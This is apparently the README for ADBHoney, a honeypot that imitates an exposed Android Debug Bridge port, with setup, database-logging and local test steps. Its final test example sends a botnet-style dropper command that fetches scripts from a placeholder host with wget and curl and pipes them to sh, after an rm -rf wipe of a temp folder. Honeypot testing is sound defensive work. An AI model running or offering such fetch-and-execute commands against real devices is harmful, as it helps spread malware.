# Installation guide (on Ubuntu 16.04):

1) (Optional) Create user *adbh*  (not root user) and switch to it
``` $ sudo su - adbh ```
2) Create virtual envirionment (Python 2.7.\*) with name *adbh_env*
``` $ virtualenv --python=python2 adbh_env ```
``` $ cd adbh_env/ ```
3) Activate the envirionment
``` $ source ./bin/activate ```
``` $ cd .. ```
4) Create folder *adbh_project* inside *adbh_env*
``` $ mkdir adbh_project ```
``` $ cd adbh_project/ ```
5) Clone the project from the repository
``` $ git https://github.com/venetay/ADBHoney.git . ```
6) Install requitements
	(Dependance: sudo apt-get install libmysqlclient-dev python-dev)
``` $ pip install -r requirements.txt ```
7) Start
``` $ python adbhoney.py ```

============================================================

## MySQL Configuration

First create an empty database named 'adbhoney'.
```
$ mysql -u root -p
CREATE DATABASE adbhoney;
```

Create a adbhoney user account for the database and grant access privileges:

**All Privileges:**

```
GRANT ALL ON adbhoney.* TO 'adbhoney'@'localhost' IDENTIFIED BY 'PASSWORD HERE';

```

**Restricted Privileges:**

Alternatively you can grant the adbhoney account with less privileges. The following command grants the account with the
bare minimum required for the output logging to function:

```
GRANT INSERT, SELECT, UPDATE ON adbhoney.* TO 'adbhoney'@'localhost' IDENTIFIED BY 'PASSWORD HERE';
```

Apply the privilege settings and exit mysql.
```
FLUSH PRIVILEGES;
exit
```

Next, log into the MySQL database using the adbhoney account to verify proper access privileges and load the database schema provided in the docs/sql/ directory:
```
$ cd adbhoney/docs/sql/
$ mysql -u adbhoney -p
USE adbhoney;
source mysql.sql;
exit
```

# MySQL plugin uses geolocation.
1) Download GeoLite2-ASN.mmdb and GeoLite2-City.mmdb
``` https://dev.maxmind.com/geoip/geoip2/geolite2/ ```
2) Set the right location of the databases used for geolocation in the config file


==================================================


## SQLite3 logging module

Logging to SQLite3 database. To init the database, use the script
docs/sql/sqlite3.sql:
     sqlite3 <db_file> < docs/sql/sqlite3.sql


===================================================
# Start and test example

* test adb commands

```
sudo apt install adb
// sudo apt install android-tools-adb
```

---------------------------------------------------------------------

terminal1:
``` .../ADBHoney$ python adbhoney.py ```

---------------------------------------------------------------------

terminal2:
``` $ nmap 127.0.0.1 ```

```
$ adb connect 127.0.0.1
$ adb connect 127.0.0.1:5555
//* daemon not running. starting it now on port 5037 *
//* daemon started successfully *
//connected to 127.0.0.1:5555
```

```
$ adb devices
//List of devices attached
//emulator-5554	device
//127.0.0.1:5555	device
```

```
$ adb -s 127.0.0.1:5555  push -p filename /sdcard/
//Transferring: 5078064/5078064 (100%)
//4805 KB/s (5078064 bytes in 1.031s)
```

``` $ adb -s 127.0.0.1:5555 shell ```

``` $ adb -s 127.0.0.1:5555 shell "rm -rf /data/local/tmp/*" ```

```
$ adb -s 127.0.0.1:5555 shell "cd /data/local/tmp;wget http://yyy.yyy.yyy.yyy/br -O- >br;sh br;busybox wget http://yyy.yyy.yyy.yyy/r -O- >r;sh r;curl http://yyy.yyy.yyy.yyy/c >c;sh c;busybox curl http://yyy.yyy.yyy.yyy/bc >bc;sh bc"
```
